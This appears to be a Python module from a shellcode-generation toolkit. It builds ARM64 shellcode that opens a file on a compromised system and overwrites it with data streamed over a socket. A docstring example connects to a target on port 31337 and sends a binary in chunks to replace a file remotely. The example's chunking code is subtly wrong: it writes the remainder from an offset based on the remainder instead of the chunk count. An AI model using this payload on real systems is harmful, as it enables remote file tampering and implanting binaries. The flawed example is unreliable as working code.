# overwrites a file with user's data

import open_file
import read_from_stack
import write_to_stack

O_RDONLY = 00000000
O_WRONLY = 00000001
O_RDWR   = 00000002
O_CREAT  = 00000100
MAXSIZE  = 128

def generate(filepath, sock, isNewFile=False):
    """overwrites a file with user's data

    argument:
        filepath (str)    : file name to open
        sock (int/str/reg): read a sock to write data
    
    Examples:
        sending a big file to remote to write

    >>> HOST = 'hostname'
    >>> PORT = 31337
    >>> MAXSIZE = 128
    >>> sc  = scgen.overwrite('./binary', 4)
    >>> sc += scgen.exit(0)
    >>> xsc = CompileSC( (sc), isThumb=True)
    >>> s = socket(AF_INET, SOCK_STREAM)
    >>> s.connect( (HOST, PORT) )
    >>> f = s.makefile('rw', bufsize=0)
    >>> f.write(xsc + '\\n')
    >>> data = open('/path/to/binary', 'rb').read()
    >>> size = len(data)
    >>> mod  = size % MAXSIZE
    >>> div  = size / MAXSIZE
    >>> for i in range(0, div):
    >>>    f.write(data[i*128:(i+1)*MAXSIZE])
    >>> if div:
    >>>    f.write(data[mod*MAXSIZE:])
    """

    if isNewFile:
        sc = open_file.generate(filepath, O_RDWR|O_CREAT, 0755)
    else:
        sc = open_file.generate(filepath, O_RDWR)
    sc += """
loop_1:
    """
    sc += write_to_stack.generate(sock, MAXSIZE)
    sc += """
    mov x5, x0
    """
    sc += read_from_stack.generate('x6', 'x0')

    sc += """
    cmp x5, %s
    beq loop_1
    """ % (MAXSIZE)

    return sc
